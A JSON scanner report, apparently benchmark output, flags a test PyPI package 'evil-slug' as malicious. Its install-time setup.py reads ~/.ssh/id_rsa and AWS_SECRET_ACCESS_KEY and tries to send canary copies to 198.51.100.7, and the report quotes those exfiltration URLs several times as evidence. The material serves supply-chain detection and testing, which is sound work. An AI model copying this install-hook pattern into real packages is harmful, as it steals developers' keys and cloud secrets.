@@ -1,0 +1,318 @@
+{
+ "schema_version": "1.0",
+ "package": {
+  "name": "evil-slug",
+  "version": "0.1",
+  "ecosystem": "pypi",
+  "sha256": "6b66f86976883ab14fb903a238ded4ec22a295d01fd3d02e03be641d4bec8bd9",
+  "path": "bench/packages/malicious/evil_slug"
+ },
+ "verdict": "MALICIOUS-EVIDENT",
+ "action": "BLOCK",
+ "score": 29.0,
+ "confidence": "high",
+ "summary": "evil-slug: behaviour contradicts its claims. Independent signals: canary_access, canary_in_bytes, network_unclaimed.",
+ "findings": [
+  {
+   "id": "f0",
+   "rule": "canary_read_then_network",
+   "title": "Fake secret read, then network attempt",
+   "severity": "critical",
+   "score": 12.0,
+   "capability": "fs_read_sensitive",
+   "phases": [
+    "install"
+   ],
+   "profiles": [
+    "dev"
+   ],
+   "env_differential": false,
+   "canary_hit": true,
+   "signal_class": "canary_access",
+   "claim": {
+    "status": "not_claimed",
+    "quote": "A tiny string utility that turns titles into URL slugs",
+    "source": "readme"
+   },
+   "events": [
+    "ev0",
+    "ev2"
+   ],
+   "evidence": [
+    {
+     "event_id": "ev0",
+     "file": "/w/site/setup.py",
+     "line": 5,
+     "phase": "install",
+     "profile": "dev",
+     "outcome": "succeeded",
+     "detail": {
+      "path": "~/.ssh/id_rsa",
+      "mode": "r"
+     }
+    },
+    {
+     "event_id": "ev2",
+     "file": "/w/site/setup.py",
+     "line": 6,
+     "phase": "install",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f7778%0A-----END%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYAWSSECRETENVe214f7f330db",
+      "method": "GET",
+      "data_head": "None",
+      "canary_in_bytes": true
+     }
+    }
+   ],
+   "explanation": "During install (install, profile dev), setup.py:5 read the sensitive file ~/.ssh/id_rsa. The README says: \"A tiny string utility that turns titles into URL slugs\" (nothing there licenses it). Outcome: succeeded. Then install-phase network attempt to http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f followed. Canary(ies): ssh_key."
+  },
+  {
+   "id": "f1",
+   "rule": "canary_in_outgoing_bytes",
+   "title": "Fake secret content found inside an outgoing request",
+   "severity": "high",
+   "score": 8.0,
+   "capability": "network",
+   "phases": [
+    "install"
+   ],
+   "profiles": [
+    "dev"
+   ],
+   "env_differential": false,
+   "canary_hit": true,
+   "signal_class": "canary_in_bytes",
+   "claim": {
+    "status": "not_claimed",
+    "quote": "A tiny string utility that turns titles into URL slugs",
+    "source": "readme"
+   },
+   "events": [
+    "ev2"
+   ],
+   "evidence": [
+    {
+     "event_id": "ev2",
+     "file": "/w/site/setup.py",
+     "line": 6,
+     "phase": "install",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f7778%0A-----END%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYAWSSECRETENVe214f7f330db",
+      "method": "GET",
+      "data_head": "None",
+      "canary_in_bytes": true
+     }
+    }
+   ],
+   "explanation": "During install (install, profile dev), setup.py:6 attempted network access to http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f. The README says: \"A tiny string utility that turns titles into URL slugs\" (nothing there licenses it). Outcome: blocked. The request carried canary token(s): aws_secret_env, ssh_key."
+  },
+  {
+   "id": "f3",
+   "rule": "capability_not_claimed",
+   "title": "env_secrets observed but not claimed",
+   "severity": "medium",
+   "score": 5.0,
+   "capability": "env_secrets",
+   "phases": [
+    "install"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "env_differential": false,
+   "canary_hit": false,
+   "signal_class": "mismatch_other",
+   "claim": {
+    "status": "not_claimed",
+    "quote": "A tiny string utility that turns titles into URL slugs",
+    "source": "readme"
+   },
+   "events": [
+    "ev1",
+    "ev6"
+   ],
+   "evidence": [
+    {
+     "event_id": "ev1",
+     "file": "/w/site/setup.py",
+     "line": 6,
+     "phase": "install",
+     "profile": "dev",
+     "outcome": "succeeded",
+     "detail": {
+      "name": "AWS_SECRET_ACCESS_KEY"
+     }
+    },
+    {
+     "event_id": "ev6",
+     "file": "/w/site/setup.py",
+     "line": 6,
+     "phase": "install",
+     "profile": "ci",
+     "outcome": "succeeded",
+     "detail": {
+      "name": "AWS_SECRET_ACCESS_KEY"
+     }
+    }
+   ],
+   "explanation": "During install (install, profile dev), setup.py:6 read the secret-looking environment variable AWS_SECRET_ACCESS_KEY. The README says: \"A tiny string utility that turns titles into URL slugs\" (nothing there licenses it). Outcome: succeeded."
+  },
+  {
+   "id": "f2",
+   "rule": "network_unclaimed",
+   "title": "Network access in install phase not licensed by the package's claims",
+   "severity": "medium",
+   "score": 4.0,
+   "capability": "network",
+   "phases": [
+    "install"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "env_differential": false,
+   "canary_hit": false,
+   "signal_class": "network_unclaimed",
+   "claim": {
+    "status": "not_claimed",
+    "quote": "A tiny string utility that turns titles into URL slugs",
+    "source": "readme"
+   },
+   "events": [
+    "ev2",
+    "ev3",
+    "ev4",
+    "ev7",
+    "ev8",
+    "ev9"
+   ],
+   "evidence": [
+    {
+     "event_id": "ev2",
+     "file": "/w/site/setup.py",
+     "line": 6,
+     "phase": "install",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f7778%0A-----END%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYAWSSECRETENVe214f7f330db",
+      "method": "GET",
+      "data_head": "None",
+      "canary_in_bytes": true
+     }
+    },
+    {
+     "event_id": "ev3",
+     "file": "/w/site/setup.py",
+     "line": 6,
+     "phase": "install",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "host": "198.51.100.7"
+     }
+    },
+    {
+     "event_id": "ev4",
+     "file": "/w/site/setup.py",
+     "line": 6,
+     "phase": "install",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "dest": "198.51.100.7:80"
+     }
+    },
+    {
+     "event_id": "ev7",
+     "file": "/w/site/setup.py",
+     "line": 6,
+     "phase": "install",
+     "profile": "ci",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY54a2d51dcc71%0A-----END%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYAWSSECRETENV654782554144",
+      "method": "GET",
+      "data_head": "None",
+      "canary_in_bytes": true
+     }
+    },
+    {
+     "event_id": "ev8",
+     "file": "/w/site/setup.py",
+     "line": 6,
+     "phase": "install",
+     "profile": "ci",
+     "outcome": "blocked",
+     "detail": {
+      "host": "198.51.100.7"
+     }
+    },
+    {
+     "event_id": "ev9",
+     "file": "/w/site/setup.py",
+     "line": 6,
+     "phase": "install",
+     "profile": "ci",
+     "outcome": "blocked",
+     "detail": {
+      "dest": "198.51.100.7:80"
+     }
+    }
+   ],
+   "explanation": "During install (install, profile dev), setup.py:6 attempted network access to http://198.51.100.7/c?d=-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----%0ATLCANARYSSHKEY83f9761f. The README says: \"A tiny string utility that turns titles into URL slugs\" (nothing there licenses it). Outcome: blocked."
+  }
+ ],
+ "independent_signals": [
+  "canary_access",
+  "canary_in_bytes",
+  "network_unclaimed"
+ ],
+ "coverage": {
+  "phases_run": [
+   "install",
+   "import",
+   "call"
+  ],
+  "profiles_run": [
+   "dev",
+   "ci"
+  ],
+  "variants_run": [
+   "default"
+  ],
+  "triggers_run": [
+   "call_all",
+   "import_all",
+   "install"
+  ],
+  "install_completed": true,
+  "install_note": null,
+  "network": "blocked",
+  "callables_total": 1,
+  "callables_exercised": 1,
+  "native_skipped": [],
+  "strace_layer": false,
+  "not_observed": [
+   "real `pip install` (wheel/.pth/sitecustomize) not exercised (v0 uses setup.py egg_info)",
+   "fresh-interpreter startup not tested",
+   "clock+30d variant not run",
+   "CLI entry points not run",
+   "strace layer not active (native code is invisible)"
+  ],
+  "whitelisted_or_dropped_events": 0
+ },
+ "claims_summary": {
+  "intents": [
+   "string_util"
+  ],
+  "claimed_capabilities": [],
+  "unknown_intent": false
+ }
+}
